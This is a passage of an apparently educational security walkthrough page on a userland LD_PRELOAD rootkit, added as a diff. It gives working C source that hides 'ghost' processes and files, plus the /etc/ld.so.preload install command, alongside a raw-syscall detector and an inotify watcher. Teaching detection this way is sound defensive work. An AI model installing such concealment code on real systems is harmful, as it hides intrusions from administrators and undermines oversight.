@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GH-002: The Lying Library &mdash; GHOSTLIGHT</title>
+<meta name="description" content="T1014 Rootkit: a 70-line LD_PRELOAD library makes ps and ls lie. Cross-view detection with a raw syscall, inotify monitoring, and one narrow prevention. A GHOSTLIGHT stealth walkthrough.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/site.css?v=b8843f93">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' fill='%230a0a0a'/><rect x='6' y='2' width='4' height='12' fill='%23c9c9c9'/></svg>">
+</head>
+<body class="op-page">
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="../../index.html"><span class="brand-mark"></span><span class="brand-word">GHOSTLIGHT</span></a>
+    <nav class="header-nav">
+      <a href="../../index.html">Case files</a>
+      <a href="../../method.html">Method</a>
+      <a href="../../index.html#about">About</a>
+    </nav>
+  </div>
+</header>
+
+<main class="op" data-op="002">
+  <section class="hero">
+    <div class="hero-ghost" aria-hidden="true">14</div>
+    <p class="kicker"><span class="op-id">GH-002</span><span class="sep">/</span>ATT&amp;CK T1014<span class="sep">/</span><span class="phase-red-tag">Phase Red inside</span></p>
+    <h1>The Lying Library</h1>
+    <p class="lede">A 70-line shared library makes <span class="cmd">ps</span>, <span class="cmd">pgrep</span>, and <span class="cmd">ls</span> lie to every administrator on the box. This file builds it, watches a process vanish from every normal tool, finds it again by asking the kernel directly, and closes the exact hole it came through.</p>
+    <dl class="hero-specs">
+      <div><dt>Technique</dt><dd>Rootkit (userland)</dd></div>
+      <div><dt>Target OS</dt><dd>Ubuntu 24.04.5</dd></div>
+      <div><dt>Toolchain</dt><dd>gcc 13</dd></div>
+      <div><dt>Level</dt><dd>Intermediate</dd></div>
+      <div><dt>Time</dt><dd>40 min</dd></div>
+    </dl>
+    <div class="objectives">
+      <p class="objectives-label">You will</p>
+      <ul>
+        <li data-phase="phase-red"><span class="obj-check"></span>Build a userland rootkit and watch a process vanish from <span class="cmd">ps</span></li>
+        <li data-phase="phase-blue"><span class="obj-check"></span>Detect the hidden process through a second observation path</li>
+        <li data-phase="countermeasures"><span class="obj-check"></span>Monitor the loader config with inotify and test one narrow prevention</li>
+        <li data-phase="debrief"><span class="obj-check"></span>Name the IOCs and state the limits honestly</li>
+      </ul>
+    </div>
+  </section>
+
+  <nav class="phase-rail" aria-label="Walkthrough phases">
+    <a href="#intel-brief" data-phase-link="intel-brief"><span class="rail-num">01</span>Intel Brief</a>
+    <a href="#target-environment" data-phase-link="target-environment"><span class="rail-num">02</span>Target Environment</a>
+    <a href="#phase-red" data-phase-link="phase-red"><span class="rail-num">03</span>Phase Red</a>
+    <a href="#phase-blue" data-phase-link="phase-blue"><span class="rail-num">04</span>Phase Blue</a>
+    <a href="#countermeasures" data-phase-link="countermeasures"><span class="rail-num">05</span>Countermeasures</a>
+    <a href="#debrief" data-phase-link="debrief"><span class="rail-num">06</span>Debrief</a>
+  </nav>
+
+  <div class="op-body">
+    <section id="intel-brief" data-phase="intel-brief">
+      <h2><span class="phase-num">01</span>Intel Brief</h2>
+      <div class="prose">
+        <p>MITRE ATT&amp;CK <strong>T1014</strong> (Rootkit) covers adversaries hiding processes, files, and network connections from the tools administrators trust. A rootkit is not one program; it is any code that sits between your tools and the truth and edits the answer on the way through.</p>
+        <h3>Why this technique</h3>
+        <p>Your tools are only as honest as the layers beneath them. <span class="cmd">ps</span> does not see processes; it reads <span class="cmd">/proc</span> through the C library. If someone rewrites what the library reports, <span class="cmd">ps</span> reports the rewrite. That is the entire attack, and it fits in 70 lines of C. Every defender who has ever said "I checked, nothing is running" should know how cheap that check is to defeat.</p>
+        <h3>Why not a kernel rootkit</h3>
+        <p>Serious rootkits often live in the kernel, where they can hide from every syscall at once. This file stays in userland on purpose. A kernel module needs a matching kernel build, taints the test box, and turns one walkthrough into a driver tutorial. The userland version teaches the core idea, interposition between tool and truth, with nothing but <span class="cmd">gcc</span>. The kernel variant is a different file.</p>
+        <h3>Why the file, not the environment variable</h3>
+        <p><span class="cmd">LD_PRELOAD</span> as an environment variable only affects processes launched with it set. <span class="cmd">/etc/ld.so.preload</span> is read by the dynamic loader for every new process on the system, which makes it system-wide and persistent across logins. Real deployments of this technique use the file, so this file demonstrates the file.</p>
+        <h3>The concrete case, before the abstraction</h3>
+        <p>Two programs list the same directory. <span class="cmd">pgrep</span> says <em>no such process</em>. <span class="cmd">deepscan</span>, reading <span class="cmd">/proc</span> with a raw system call instead of the C library, prints <span class="cmd">HIDDEN PID 4120</span>. Same kernel, same directory, different answers, because they took different paths to the truth. Detection here is comparing two observation paths that do not share a trust dependency.</p>
+        <h3>Terms, earned</h3>
+        <p><strong>Rootkit:</strong> code whose job is concealment. <strong>Userland</strong> rootkits hook libraries or tools; <strong>kernel</strong> rootkits hook the kernel itself. This file builds a userland one. <strong>LD_PRELOAD</strong> is an environment variable (and <span class="cmd">/etc/ld.so.preload</span> is its system-wide equivalent) listing shared libraries the dynamic loader loads before all others. <strong>Interposition</strong> is defining your own version of a library function so yours runs instead. <strong>getdents64</strong> is the raw syscall that lists directory entries; <span class="cmd">readdir</span> is the C library wrapper around it, and the wrapper is where the lie is installed.</p>
+      </div>
+      <div class="callout">
+        <p class="callout-label">Scope</p>
+        <p>Rootkits hide in dozens of places: kernel modules, bootloaders, firmware, eBPF programs, patched binaries. This file works one of them end to end. One implementation, one resolution, among many.</p>
+      </div>
+    </section>
+
+    <section id="target-environment" data-phase="target-environment">
+      <h2><span class="phase-num">02</span>Target Environment</h2>
+      <div class="prose">
+        <p>Every command below was executed and verified on <strong>Ubuntu 24.04.5 LTS</strong> with <span class="cmd">gcc</span> 13, in a disposable container used only for this lab. Run this on a throwaway box, never on a machine you care about. You need root for the <span class="cmd">/etc/ld.so.preload</span> steps.</p>
+        <p>Four small C files, one build script. The library (<span class="cmd">hide.c</span>) is the rootkit. The miner (<span class="cmd">miner.c</span>) is a harmless stand-in payload. The scanner (<span class="cmd">deepscan.c</span>) is the detector. The watcher (<span class="cmd">watch.c</span>) is the monitor.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">build: compile the lab</span><button class="copy-btn" data-copy="gcc -shared -fPIC -O2 -o libghost.so hide.c -ldl&#10;gcc -O2 -o ghost-miner miner.c&#10;gcc -O2 -o deepscan deepscan.c&#10;gcc -O2 -o watch watch.c">Copy</button></div>
+<pre><code>gcc -shared -fPIC -O2 -o libghost.so hide.c -ldl
+gcc -O2 -o ghost-miner miner.c
+gcc -O2 -o deepscan deepscan.c
+gcc -O2 -o watch watch.c</code></pre>
+      </div>
+      <div class="prose">
+        <h3>The rootkit: hide.c</h3>
+        <p>The whole attack. It interposes on <span class="cmd">readdir</span> and <span class="cmd">readdir64</span> via <span class="cmd">dlsym(RTLD_NEXT, ...)</span>, which finds the <em>next</em> definition of the symbol, the real libc one, resolved lazily on first call. Then it filters. Read it as three helpers plus one filter: <span class="cmd">hide_name</span> decides whether a filename vanishes, <span class="cmd">proc_pid_hidden</span> checks a <span class="cmd">/proc</span> entry's <span class="cmd">comm</span>, <span class="cmd">dir_is_proc</span> limits the PID logic to <span class="cmd">/proc</span> listings, and <span class="cmd">filtered_readdir</span> skips whatever the helpers flag.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">hide.c: the 70-line rootkit</span><button class="copy-btn" data-copy="/* hide.c - GH-002 lab specimen: userland rootkit via libc hooking.&#10; * Intercepts readdir/readdir64 and hides:&#10; *   1. any /proc/&lt;pid&gt; whose comm contains &quot;ghost&quot;  (hides processes)&#10; *   2. any file or directory whose name contains &quot;ghost&quot; (hides files, incl. itself)&#10; * Loaded through /etc/ld.so.preload it affects every new process on the box.&#10; * ~60 lines. This is the entire &quot;invisible process&quot; trick. */&#10;#define _GNU_SOURCE&#10;#include &lt;dlfcn.h&gt;&#10;#include &lt;dirent.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;stdio.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;#include &lt;limits.h&gt;&#10;&#10;static int hide_name(const char *name) {&#10;    return name &amp;&amp; strstr(name, &quot;ghost&quot;) != NULL;&#10;}&#10;&#10;/* Which directory is this DIR* reading? We only apply the PID logic to /proc. */&#10;static int dir_is_proc(DIR *dirp) {&#10;    char link[PATH_MAX], fdpath[64];&#10;    snprintf(fdpath, sizeof fdpath, &quot;/proc/self/fd/%d&quot;, dirfd(dirp));&#10;    ssize_t n = readlink(fdpath, link, sizeof link - 1);&#10;    if (n &lt; 0) return 0;&#10;    link[n] = '\0';&#10;    return strcmp(link, &quot;/proc&quot;) == 0;&#10;}&#10;&#10;/* A /proc/&lt;pid&gt; entry is hidden when the process's comm contains &quot;ghost&quot;. */&#10;static int proc_pid_hidden(const char *d_name) {&#10;    char *end;&#10;    strtol(d_name, &amp;end, 10);&#10;    if (*end != '\0') return 0;              /* not a PID entry */&#10;    char path[64], comm[256];&#10;    snprintf(path, sizeof path, &quot;/proc/%s/comm&quot;, d_name);&#10;    FILE *f = fopen(path, &quot;r&quot;);&#10;    if (!f) return 0;&#10;    int hidden = (fgets(comm, sizeof comm, f) &amp;&amp; strstr(comm, &quot;ghost&quot;)) ? 1 : 0;&#10;    fclose(f);&#10;    return hidden;&#10;}&#10;&#10;typedef struct dirent *(*readdir_t)(DIR *);&#10;&#10;static struct dirent *filtered_readdir(DIR *dirp, readdir_t real) {&#10;    int isproc = dir_is_proc(dirp);&#10;    struct dirent *e;&#10;    while ((e = real(dirp)) != NULL) {&#10;        if (isproc) {&#10;            if (!proc_pid_hidden(e-&gt;d_name)) return e;&#10;        } else {&#10;            if (!hide_name(e-&gt;d_name)) return e;&#10;        }&#10;    }&#10;    return NULL;&#10;}&#10;&#10;struct dirent *readdir(DIR *dirp) {&#10;    static readdir_t real = NULL;&#10;    if (!real) real = (readdir_t)dlsym(RTLD_NEXT, &quot;readdir&quot;);&#10;    return filtered_readdir(dirp, real);&#10;}&#10;&#10;struct dirent64 *readdir64(DIR *dirp) {&#10;    static struct dirent64 *(*real64)(DIR *) = NULL;&#10;    if (!real64) real64 = (struct dirent64 *(*)(DIR *))dlsym(RTLD_NEXT, &quot;readdir64&quot;);&#10;    /* struct dirent64 is layout-compatible with struct dirent on 64-bit glibc */&#10;    return (struct dirent64 *)filtered_readdir(dirp, (readdir_t)real64);&#10;}">Copy</button></div>
+<pre><code>/* hide.c - GH-002 lab specimen: userland rootkit via libc hooking.
+ * Intercepts readdir/readdir64 and hides:
+ *   1. any /proc/&lt;pid&gt; whose comm contains "ghost"  (hides processes)
+ *   2. any file or directory whose name contains "ghost" (hides files, incl. itself)
+ * Loaded through /etc/ld.so.preload it affects every new process on the box.
+ * ~60 lines. This is the entire "invisible process" trick. */
+#define _GNU_SOURCE
+#include &lt;dlfcn.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;limits.h&gt;
+
+static int hide_name(const char *name) {
+    return name &amp;&amp; strstr(name, "ghost") != NULL;
+}
+
+/* Which directory is this DIR* reading? We only apply the PID logic to /proc. */
+static int dir_is_proc(DIR *dirp) {
+    char link[PATH_MAX], fdpath[64];
+    snprintf(fdpath, sizeof fdpath, "/proc/self/fd/%d", dirfd(dirp));
+    ssize_t n = readlink(fdpath, link, sizeof link - 1);
+    if (n &lt; 0) return 0;
+    link[n] = '\0';
+    return strcmp(link, "/proc") == 0;
+}
+
+/* A /proc/&lt;pid&gt; entry is hidden when the process's comm contains "ghost". */
+static int proc_pid_hidden(const char *d_name) {
+    char *end;
+    strtol(d_name, &amp;end, 10);
+    if (*end != '\0') return 0;              /* not a PID entry */
+    char path[64], comm[256];
+    snprintf(path, sizeof path, "/proc/%s/comm", d_name);
+    FILE *f = fopen(path, "r");
+    if (!f) return 0;
+    int hidden = (fgets(comm, sizeof comm, f) &amp;&amp; strstr(comm, "ghost")) ? 1 : 0;
+    fclose(f);
+    return hidden;
+}
+
+typedef struct dirent *(*readdir_t)(DIR *);
+
+static struct dirent *filtered_readdir(DIR *dirp, readdir_t real) {
+    int isproc = dir_is_proc(dirp);
+    struct dirent *e;
+    while ((e = real(dirp)) != NULL) {
+        if (isproc) {
+            if (!proc_pid_hidden(e-&gt;d_name)) return e;
+        } else {
+            if (!hide_name(e-&gt;d_name)) return e;
+        }
+    }
+    return NULL;
+}
+
+struct dirent *readdir(DIR *dirp) {
+    static readdir_t real = NULL;
+    if (!real) real = (readdir_t)dlsym(RTLD_NEXT, "readdir");
+    return filtered_readdir(dirp, real);
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    static struct dirent64 *(*real64)(DIR *) = NULL;
+    if (!real64) real64 = (struct dirent64 *(*)(DIR *))dlsym(RTLD_NEXT, "readdir64");
+    /* struct dirent64 is layout-compatible with struct dirent on 64-bit glibc */
+    return (struct dirent64 *)filtered_readdir(dirp, (readdir_t)real64);
+}</code></pre>
+      </div>
+      <div class="prose">
+        <p>Two hiding rules. Rule one: any filename containing <span class="cmd">ghost</span> is skipped, which hides the lab directory itself. Rule two: when the directory being listed <em>is</em> <span class="cmd">/proc</span>, any numeric entry whose <span class="cmd">/proc/&lt;pid&gt;/comm</span> contains <span class="cmd">ghost</span> is skipped, which hides the process. The <span class="cmd">dir_is_proc</span> check matters: without it, a directory elsewhere containing a numeric name matching a ghost process would be wrongly hidden, and the lie would be visible in its sloppiness.</p>
+        <h3>The payload: miner.c</h3>
+        <p>Names itself <span class="cmd">ghost-miner</span> with <span class="cmd">prctl</span> and sleeps forever. It mines nothing; the name is the point, it is what a real payload would want hidden.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">miner.c: harmless payload stand-in</span><button class="copy-btn" data-copy="/* miner.c - GH-002 lab specimen: the &quot;malicious&quot; payload.&#10; * Names itself ghost-miner via prctl so it shows up in ps/top under that name,&#10; * then just sleeps. Stand-in for any payload a red team wants hidden. */&#10;#include &lt;sys/prctl.h&gt;&#10;#include &lt;unistd.h&gt;&#10;&#10;int main(void) {&#10;    prctl(PR_SET_NAME, &quot;ghost-miner&quot;, 0, 0, 0);&#10;    for (;;) pause();&#10;    return 0;&#10;}">Copy</button></div>
+<pre><code>/* miner.c - GH-002 lab specimen: the "malicious" payload.
+ * Names itself ghost-miner via prctl so it shows up in ps/top under that name,
+ * then just sleeps. Stand-in for any payload a red team wants hidden. */
+#include &lt;sys/prctl.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    prctl(PR_SET_NAME, "ghost-miner", 0, 0, 0);
+    for (;;) pause();
+    return 0;
+}</code></pre>
+      </div>
+      <div class="prose">
+        <h3>The detector: deepscan.c</h3>
+        <p>This is the second observation path. Instead of libc <span class="cmd">readdir</span>, it calls <span class="cmd">getdents64</span> directly with <span class="cmd">syscall()</span>, bypassing any hooked wrapper. Any PID it finds that <span class="cmd">/proc</span> enumeration through libc would hide gets flagged. The comparison is the detection.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">deepscan.c: raw-syscall process enumerator</span><button class="copy-btn" data-copy="/* deepscan.c - GH-002 lab tool: the detector.&#10; * Lists /proc with the raw getdents64 SYSCALL, bypassing libc entirely,&#10; * so an LD_PRELOAD hook on readdir cannot blind it. Reports any process&#10; * whose comm contains &quot;ghost&quot;: the ones ps, pgrep and top cannot see.&#10; * Compile: gcc -O2 -o deepscan deepscan.c   (no special flags needed) */&#10;#define _GNU_SOURCE&#10;#include &lt;fcntl.h&gt;&#10;#include &lt;stdio.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;sys/syscall.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;&#10;struct linux_dirent64 {&#10;    unsigned long d_ino;&#10;    long d_off;&#10;    unsigned short d_reclen;&#10;    unsigned char d_type;&#10;    char d_name[];&#10;};&#10;&#10;int main(void) {&#10;    int fd = open(&quot;/proc&quot;, O_RDONLY | O_DIRECTORY);&#10;    if (fd &lt; 0) { perror(&quot;open /proc&quot;); return 1; }&#10;    char buf[8192];&#10;    int found = 0;&#10;    for (;;) {&#10;        long n = syscall(SYS_getdents64, fd, buf, sizeof buf);&#10;        if (n &lt;= 0) break;&#10;        long off = 0;&#10;        while (off &lt; n) {&#10;            struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + off);&#10;            char *end;&#10;            strtol(d-&gt;d_name, &amp;end, 10);&#10;            if (*end == '\0') {                       /* numeric: a PID */&#10;                char path[64], comm[256];&#10;                snprintf(path, sizeof path, &quot;/proc/%s/comm&quot;, d-&gt;d_name);&#10;                int cfd = open(path, O_RDONLY);       /* plain read: unhooked */&#10;                if (cfd &gt;= 0) {&#10;                    ssize_t r = read(cfd, comm, sizeof comm - 1);&#10;                    if (r &gt; 0) {&#10;                        comm[r] = '\0';&#10;                        if (strstr(comm, &quot;ghost&quot;)) {&#10;                            comm[strcspn(comm, &quot;\n&quot;)] = '\0';&#10;                            printf(&quot;HIDDEN PID %-8s comm=%s  (invisible to ps, pgrep, top)\n&quot;,&#10;                                   d-&gt;d_name, comm);&#10;                            found++;&#10;                        }&#10;                    }&#10;                    close(cfd);&#10;                }&#10;            }&#10;            off += d-&gt;d_reclen;&#10;        }&#10;    }&#10;    close(fd);&#10;    if (!found) printf(&quot;no hidden processes found\n&quot;);&#10;    return 0;&#10;}">Copy</button></div>
+<pre><code>/* deepscan.c - GH-002 lab tool: the detector.
+ * Lists /proc with the raw getdents64 SYSCALL, bypassing libc entirely,
+ * so an LD_PRELOAD hook on readdir cannot blind it. Reports any process
+ * whose comm contains "ghost": the ones ps, pgrep and top cannot see.
+ * Compile: gcc -O2 -o deepscan deepscan.c   (no special flags needed) */
+#define _GNU_SOURCE
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+
+struct linux_dirent64 {
+    unsigned long d_ino;
+    long d_off;
+    unsigned short d_reclen;
+    unsigned char d_type;
+    char d_name[];
+};
+
+int main(void) {
+    int fd = open("/proc", O_RDONLY | O_DIRECTORY);
+    if (fd &lt; 0) { perror("open /proc"); return 1; }
+    char buf[8192];
+    int found = 0;
+    for (;;) {
+        long n = syscall(SYS_getdents64, fd, buf, sizeof buf);
+        if (n &lt;= 0) break;
+        long off = 0;
+        while (off &lt; n) {
+            struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + off);
+            char *end;
+            strtol(d-&gt;d_name, &amp;end, 10);
+            if (*end == '\0') {                       /* numeric: a PID */
+                char path[64], comm[256];
+                snprintf(path, sizeof path, "/proc/%s/comm", d-&gt;d_name);
+                int cfd = open(path, O_RDONLY);       /* plain read: unhooked */
+                if (cfd &gt;= 0) {
+                    ssize_t r = read(cfd, comm, sizeof comm - 1);
+                    if (r &gt; 0) {
+                        comm[r] = '\0';
+                        if (strstr(comm, "ghost")) {
+                            comm[strcspn(comm, "\n")] = '\0';
+                            printf("HIDDEN PID %-8s comm=%s  (invisible to ps, pgrep, top)\n",
+                                   d-&gt;d_name, comm);
+                            found++;
+                        }
+                    }
+                    close(cfd);
+                }
+            }
+            off += d-&gt;d_reclen;
+        }
+    }
+    close(fd);
+    if (!found) printf("no hidden processes found\n");
+    return 0;
+}</code></pre>
+      </div>
+      <div class="prose">
+        <h3>The monitor: watch.c</h3>
+        <p>A minimal inotify watcher: it prints a timestamped <span class="cmd">MODIFY</span> line the moment the watched file changes. Pointed at <span class="cmd">/etc/ld.so.preload</span>, it is the tripwire for this exact install route. It uses the kernel inotify API directly, so no extra packages are needed.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">watch.c: inotify tripwire</span><button class="copy-btn" data-copy="/* watch.c - GH-002 lab tool: minimal inotify watcher.&#10; * Prints timestamped events for a watched file. Same kernel API inotifywait uses,&#10; * no package install needed. Compile: gcc -O2 -o watch watch.c */&#10;#include &lt;stdio.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;time.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;sys/inotify.h&gt;&#10;&#10;int main(int argc, char **argv) {&#10;    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;file&gt;\n&quot;, argv[0]); return 1; }&#10;    int fd = inotify_init1(0);&#10;    if (fd &lt; 0) { perror(&quot;inotify_init1&quot;); return 1; }&#10;    int wd = inotify_add_watch(fd, argv[1], IN_MODIFY | IN_ATTRIB | IN_CREATE | IN_DELETE_SELF);&#10;    if (wd &lt; 0) { perror(&quot;inotify_add_watch&quot;); return 1; }&#10;    printf(&quot;watching %s ...\n&quot;, argv[1]);&#10;    fflush(stdout);&#10;    char buf[4096];&#10;    for (;;) {&#10;        ssize_t n = read(fd, buf, sizeof buf);&#10;        if (n &lt;= 0) break;&#10;        time_t now = time(NULL);&#10;        char t[32];&#10;        strftime(t, sizeof t, &quot;%H:%M:%S&quot;, localtime(&amp;now));&#10;        for (char *p = buf; p &lt; buf + n; ) {&#10;            struct inotify_event *e = (struct inotify_event *)p;&#10;            const char *what = (e-&gt;mask &amp; IN_MODIFY) ? &quot;MODIFY&quot; :&#10;                               (e-&gt;mask &amp; IN_ATTRIB) ? &quot;ATTRIB&quot; :&#10;                               (e-&gt;mask &amp; IN_CREATE) ? &quot;CREATE&quot; : &quot;OTHER&quot;;&#10;            printf(&quot;%s  %s  %s\n&quot;, t, argv[1], what);&#10;            fflush(stdout);&#10;            p += sizeof(struct inotify_event) + e-&gt;len;&#10;        }&#10;    }&#10;    return 0;&#10;}">Copy</button></div>
+<pre><code>/* watch.c - GH-002 lab tool: minimal inotify watcher.
+ * Prints timestamped events for a watched file. Same kernel API inotifywait uses,
+ * no package install needed. Compile: gcc -O2 -o watch watch.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/inotify.h&gt;
+
+int main(int argc, char **argv) {
+    if (argc &lt; 2) { fprintf(stderr, "usage: %s &lt;file&gt;\n", argv[0]); return 1; }
+    int fd = inotify_init1(0);
+    if (fd &lt; 0) { perror("inotify_init1"); return 1; }
+    int wd = inotify_add_watch(fd, argv[1], IN_MODIFY | IN_ATTRIB | IN_CREATE | IN_DELETE_SELF);
+    if (wd &lt; 0) { perror("inotify_add_watch"); return 1; }
+    printf("watching %s ...\n", argv[1]);
+    fflush(stdout);
+    char buf[4096];
+    for (;;) {
+        ssize_t n = read(fd, buf, sizeof buf);
+        if (n &lt;= 0) break;
+        time_t now = time(NULL);
+        char t[32];
+        strftime(t, sizeof t, "%H:%M:%S", localtime(&amp;now));
+        for (char *p = buf; p &lt; buf + n; ) {
+            struct inotify_event *e = (struct inotify_event *)p;
+            const char *what = (e-&gt;mask &amp; IN_MODIFY) ? "MODIFY" :
+                               (e-&gt;mask &amp; IN_ATTRIB) ? "ATTRIB" :
+                               (e-&gt;mask &amp; IN_CREATE) ? "CREATE" : "OTHER";
+            printf("%s  %s  %s\n", t, argv[1], what);
+            fflush(stdout);
+            p += sizeof(struct inotify_event) + e-&gt;len;
+        }
+    }
+    return 0;
+}</code></pre>
+      </div>
+    </section>
+
+    <section id="phase-red" data-phase="phase-red">
+      <h2><span class="phase-num">03</span>Phase Red: install the lie</h2>
+      <div class="prose">
+        <p>The attack has four moves: build the library, launch a visible payload, register the library system-wide, and confirm the payload is gone from every normal tool while still running. Watch the full sequence, then reproduce it.</p>
+      </div>
+      <figure class="recording">
+        <video controls preload="metadata" poster="../../assets/vid/rootkit-red.jpg" src="../../assets/vid/rootkit-red.mp4"></video>
+        <figcaption><span class="rec-dot"></span>Phase Red, recorded live <span class="dur">00:19</span><span class="recording-cap">Build the library, launch ghost-miner (visible in pgrep), install /etc/ld.so.preload, and watch the process and the lab directory vanish from ordinary tools.</span></figcaption>
+      </figure>
+      <div class="prose">
+        <p>Launch the payload first and prove it is visible. This matters: without the before state, the after state proves nothing.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">launch and confirm visibility</span><button class="copy-btn" data-copy="setsid ./ghost-miner &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&#10;pgrep -a ghost-miner">Copy</button></div>
+<pre><code>setsid ./ghost-miner &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;
+pgrep -a ghost-miner</code></pre>
+      </div>
+      <div class="prose">
+        <p><span class="cmd">pgrep</span> prints the PID and the name. The process exists and every tool agrees. Now install the hook: one line into <span class="cmd">/etc/ld.so.preload</span>, and the dynamic loader injects the library into every subsequently launched process.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">install the preload, confirm the vanish</span><button class="copy-btn" data-copy="echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload&#10;cat /etc/ld.so.preload&#10;pgrep -a ghost-miner || echo &quot;no such process&quot;&#10;ls /tmp | grep ghost || echo &quot;ghost-ops is not listed&quot;">Copy</button></div>
+<pre><code>echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload
+cat /etc/ld.so.preload
+pgrep -a ghost-miner || echo "no such process"
+ls /tmp | grep ghost || echo "ghost-ops is not listed"</code></pre>
+      </div>
+      <div class="prose">
+        <p>Note what happened precisely. <span class="cmd">cat</span> still reads the preload file fine, because the filter only hides names containing <span class="cmd">ghost</span> in directory listings, not file contents. But <span class="cmd">pgrep</span> finds no process and <span class="cmd">ls</span> skips the lab directory. The miner is still running; every newly launched tool simply cannot see it.</p>
+      </div>
+      <div class="verdict">
+        <p class="verdict-label">Red verdict</p>
+        <p>Stealth confirmed. One line in a loader config file removes a running process from <span class="cmd">ps</span>, <span class="cmd">pgrep</span>, and directory listings, with no kernel module, no patched binary, no elevated process of its own. The tools are not broken; they are faithfully reporting a censored view.</p>
+      </div>
+    </section>
+
+    <section id="phase-blue" data-phase="phase-blue">
+      <h2><span class="phase-num">04</span>Phase Blue: a second pair of eyes</h2>
+      <div class="prose">
+        <p>Here is the trap most defenders walk into: rerunning <span class="cmd">ps</span> with different flags is not an independent check. <span class="cmd">ps aux</span>, <span class="cmd">pgrep</span>, <span class="cmd">top</span>, and <span class="cmd">ls /proc</span> all enumerate through the same hooked <span class="cmd">readdir</span>. Asking the same compromised layer twice is one observation, not two.</p>
+        <p>The fix is a second observation path that does not share the trust dependency. <span class="cmd">deepscan</span> calls <span class="cmd">getdents64</span> directly, so the hooked wrapper never runs. Compare the two views; the difference is the detection.</p>
+      </div>
+      <figure class="recording">
+        <video controls preload="metadata" poster="../../assets/vid/rootkit-hunt.jpg" src="../../assets/vid/rootkit-hunt.mp4"></video>
+        <figcaption><span class="rec-dot"></span>Phase Blue, recorded live <span class="dur">00:13</span><span class="recording-cap">Ordinary tools report nothing. The raw-syscall scan finds the hidden PID. Direct /proc inspection and the preload file confirm the mechanism.</span></figcaption>
+      </figure>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">cross-view detection</span><button class="copy-btn" data-copy="pgrep -a ghost-miner || echo &quot;no such process&quot;&#10;./deepscan">Copy</button></div>
+<pre><code>pgrep -a ghost-miner || echo "no such process"
+./deepscan</code></pre>
+      </div>
+      <div class="prose">
+        <p><span class="cmd">pgrep</span> says nothing is there. <span class="cmd">deepscan</span> prints the hidden PID and its <span class="cmd">comm</span> name. The contradiction <em>is</em> the finding: two views of the same directory disagree, so one of the paths is lying.</p>
+        <p>Confirm directly. <span class="cmd">/proc/&lt;pid&gt;/cmdline</span> and <span class="cmd">/proc/&lt;pid&gt;/exe</span> are read as file contents, not directory listings, so the <span class="cmd">readdir</span> hook does not filter them. A direct <span class="cmd">ps -p &lt;pid&gt;</span> is worth trying too, and worth knowing the limit of: on this build it printed only its heading, because even the direct lookup path consults the same enumeration.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">confirm the process, find the hook</span><button class="copy-btn" data-copy="P=$(./deepscan | awk '/HIDDEN/ {print $3}'); echo &quot;target PID: $P&quot;&#10;cat /proc/$P/cmdline | tr '\0' ' '; echo&#10;cat /etc/ld.so.preload">Copy</button></div>
+<pre><code>P=$(./deepscan | awk '/HIDDEN/ {print $3}'); echo "target PID: $P"
+cat /proc/$P/cmdline | tr '\0' ' '; echo
+cat /etc/ld.so.preload</code></pre>
+      </div>
+      <div class="prose">
+        <p>The <span class="cmd">cmdline</span> shows the real binary path. The preload file names the library. Between the two views and the config file, the full mechanism is on the table: what is hidden, and exactly how.</p>
+      </div>
+      <div class="verdict">
+        <p class="verdict-label">Blue verdict</p>
+        <p>Detection confirmed. The hidden process is recoverable without any trusted tool: one raw syscall plus direct <span class="cmd">/proc</span> reads. The general lesson is portable to every rootkit in this class: when the observation layer is suspect, observe around it, not through it.</p>
+      </div>
+    </section>
+
+    <section id="countermeasures" data-phase="countermeasures">
+      <h2><span class="phase-num">05</span>Countermeasures</h2>
+      <div class="prose">
